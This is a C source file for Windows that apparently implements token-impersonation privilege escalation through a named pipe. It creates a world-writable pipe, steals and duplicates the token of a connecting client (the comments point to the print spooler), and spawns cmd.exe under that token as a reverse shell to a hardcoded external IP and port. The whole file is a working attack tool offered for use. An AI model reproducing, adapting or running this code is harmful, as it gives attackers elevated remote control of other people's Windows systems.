#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <namedpipeapi.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <Aclapi.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#pragma warning(disable:4996) 





/* Create a DACL that will allow everyone to have full control over our pipe. */
static VOID BuildDACL(PSECURITY_DESCRIPTOR pDescriptor)
{
    PSID pSid;
    EXPLICIT_ACCESS ea;
    PACL pAcl;

    SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;

    AllocateAndInitializeSid(&sia, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0,
        &pSid);

    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = FILE_ALL_ACCESS;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPTSTR)pSid;

    if (SetEntriesInAcl(1, &ea, NULL, &pAcl) == ERROR_SUCCESS)
    {
        if (SetSecurityDescriptorDacl(pDescriptor, TRUE, pAcl, FALSE) == 0)
            printf(("[*] Failed to set DACL (0x%x)\n"), GetLastError());
    }
    else
        printf("[*] Failed to add ACE in DACL (0x%x)\n", GetLastError());
}


/* Create a SACL that will allow low integrity processes connect to our pipe. */
static VOID BuildSACL(PSECURITY_DESCRIPTOR pDescriptor)
{
    PSID pSid;
    PACL pAcl;

    SID_IDENTIFIER_AUTHORITY sia = SECURITY_MANDATORY_LABEL_AUTHORITY;
    DWORD dwACLSize = sizeof(ACL) + sizeof(SYSTEM_MANDATORY_LABEL_ACE) +
        GetSidLengthRequired(1);

    pAcl = (PACL)LocalAlloc(LPTR, dwACLSize);
    InitializeAcl(pAcl, dwACLSize, ACL_REVISION);

    AllocateAndInitializeSid(&sia, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0,
        0, 0, 0, &pSid);

    if (AddMandatoryAce(pAcl, ACL_REVISION, 0, SYSTEM_MANDATORY_LABEL_NO_WRITE_UP,
        pSid) == TRUE)
    {
        if (SetSecurityDescriptorSacl(pDescriptor, TRUE, pAcl, FALSE) == 0)
            printf("[*] Failed to set SACL (0x%x)\n", GetLastError());
    }
    else
        printf("[*] Failed to add ACE in SACL (0x%x)\n", GetLastError());
}

/* Initialize security attributes to be used by `CreateNamedPipe()' below. */
static VOID InitSecurityAttributes(PSECURITY_ATTRIBUTES pAttributes)
{
    PSECURITY_DESCRIPTOR pDescriptor;

    pDescriptor = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,
        SECURITY_DESCRIPTOR_MIN_LENGTH);
    InitializeSecurityDescriptor(pDescriptor, SECURITY_DESCRIPTOR_REVISION);

    BuildDACL(pDescriptor);
    BuildSACL(pDescriptor);

    pAttributes->nLength = sizeof(SECURITY_ATTRIBUTES);
    pAttributes->lpSecurityDescriptor = pDescriptor;
    pAttributes->bInheritHandle = TRUE;
}
static void* impersonate(void* h_pipe) {
    BOOL b_ret;
    void* p_imp_token; // Impersonate
    void* p_d_token;   // Duplicated
    char* bytes[5];
    DWORD dwread;
    b_ret = ReadFile(h_pipe, (char*)bytes, 1, &dwread, NULL);

    if (b_ret != TRUE) {
        printf("[-] Failed to read file (0x%x)\n", GetLastError());
        return NULL;
    }
    b_ret = ImpersonateNamedPipeClient(h_pipe);
    if (b_ret != TRUE) {
        printf("[-] Failed to Impersonate named pipe client (0x%x)\n", GetLastError());
        return NULL;
    }

    b_ret = OpenThreadToken(
        GetCurrentThread(),
        TOKEN_ALL_ACCESS,
        //FALSE,
        TRUE,
        &p_imp_token
    );

    if (b_ret != TRUE) {
        printf("[-] Failed to open thread (0x%x)\n", GetLastError());
        return NULL;
    }


    b_ret = DuplicateTokenEx(p_imp_token, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &p_d_token);

    if (b_ret != TRUE) {
        printf("[-] Failed to Duplicate token (0x%x)\n", GetLastError());
        CloseHandle(p_imp_token);
        return NULL;
    }


    RevertToSelf();
    return p_d_token;
}

static int enable_privilege(void* ptoken, char* sepriv) {
    BOOL b_ret;
    LUID g_privluid;
    TOKEN_PRIVILEGES g_gtokenpriv;

    RtlSecureZeroMemory(&g_gtokenpriv, sizeof(TOKEN_PRIVILEGES));

    b_ret = LookupPrivilegeValueA(NULL, sepriv, &g_privluid);
    if (b_ret != TRUE) {
        printf("[-] Failed to lookup privilege value (0x%x)\n", GetLastError());
        return -1;
    }

    g_gtokenpriv.PrivilegeCount = 1;
    g_gtokenpriv.Privileges[0].Luid = g_privluid;
    g_gtokenpriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    b_ret = AdjustTokenPrivileges(
        ptoken,
        FALSE,
        &g_gtokenpriv,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL
    );

    if (b_ret != TRUE) {
        printf("[-] Failed to adjust token privileges(0x%x)\n", GetLastError());
        return -1;
    }

    return 0;
}


static void* create_np(char* p_name)
{
    SECURITY_ATTRIBUTES sa;
    InitSecurityAttributes(&sa);
    BOOL b_ret;


    void* p_pipe;
    p_pipe = CreateNamedPipeA(
        p_name,
        PIPE_ACCESS_DUPLEX,
        //PIPE_TYPE_BYTE | PIPE_WAIT ,
        0,
        2, // Max instances
        0, // Out size
        0, //In size
        0, //Timeout
        &sa
    );
    if (p_pipe != INVALID_HANDLE_VALUE) {
        printf("[+] Pipe %s created\n", p_name);
        b_ret = ConnectNamedPipe(p_pipe, NULL);
        if (b_ret != FALSE) {
            return p_pipe;
        }
        printf("[-] Failed to connect to named pipe (0x%x)\n", GetLastError());
        CloseHandle((HANDLE)p_pipe);
    }
    else {
        printf("[-] Failed to create named pipe (0x%x)\n", GetLastError());
    }
    return NULL;

}

void RunShell(char* C2Server, int C2Port) {
    /* IMPERSONATION PART */

    BOOL b_ret;
    void* p_pipe;
    void* p_ptoken;
    void* p_itoken;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &p_ptoken);
    enable_privilege(p_ptoken, "SeImpersonatePrivilege");
    // FOR SPOOLSAMPLE USE SPOOLSS
    //p_pipe = create_np("\\\\.\\pipe\\test\\pipe\\spoolss");
    p_pipe = create_np("\\\\.\\pipe\\test");
    if (p_pipe != NULL) {
        printf("[+] Connection recieved\n");
        p_itoken = impersonate(p_pipe);

        DisconnectNamedPipe((HANDLE)p_pipe);
        CloseHandle(p_pipe);

        if (p_itoken != NULL) {
            printf("[*] Impersonating User\n");
            b_ret = ImpersonateNamedPipeClient(p_itoken);
            //b_ret = ImpersonateLoggedOnUser(p_itoken);
            if (b_ret == TRUE) {
                printf("[+] User impersonated\n");

            }
        }
        else {
            printf("[-] Failed to Impersonate user (0x%x)\n", GetLastError());
            return NULL;
        }

        /* IMPERSONATION PART */
        while (TRUE) {

            SOCKET mySocket;
            struct sockaddr_in addr;
            WSADATA version;
            BOOL b_ret;
            WSAStartup(MAKEWORD(2, 2), &version);
            // Creating socket
            mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
            addr.sin_family = AF_INET;

            addr.sin_addr.s_addr = inet_addr(C2Server);
            addr.sin_port = htons(C2Port);
            // Connecting
            if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
                closesocket(mySocket);
                WSACleanup();
                // Tries again if conenction fails
                continue;
            }
            else {
                char RecvData[DEFAULT_BUFLEN];
                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                else {



                    /* OLD */
                    // Can also become powershell
                    LPWSTR command = L"C:\\Windows\\System32\\cmd.exe";
                    STARTUPINFO sinfo;
                    PROCESS_INFORMATION pinfo;
                    memset(&sinfo, 0, sizeof(sinfo));
                    sinfo.cb = sizeof(sinfo);
                    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;

                    b_ret = CreateProcessWithTokenW(p_itoken, NULL, NULL, command, 0, NULL, NULL, &sinfo, &pinfo);
                    WaitForSingleObject(pinfo.hProcess, INFINITE);
                    CloseHandle(pinfo.hProcess);
                    CloseHandle(pinfo.hThread);
                    /* OLD */








                    memset(RecvData, 0, sizeof(RecvData));
                    int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                    if (RecvCode <= 0) {
                        closesocket(mySocket);
                        WSACleanup();
                        continue;
                    }
                    if (strcmp(RecvData, "exit\n") == 0) {
                        exit(0);
                    }
                }
            }
        }
    }
}

int main(int argc, char** argv) {
        puts("Starts");
        char host[] = "54.37.16.220";  // change this to your ip address
        int port = 51251;                //chnage this to your open port
        RunShell(host, port);
    return 0;
}
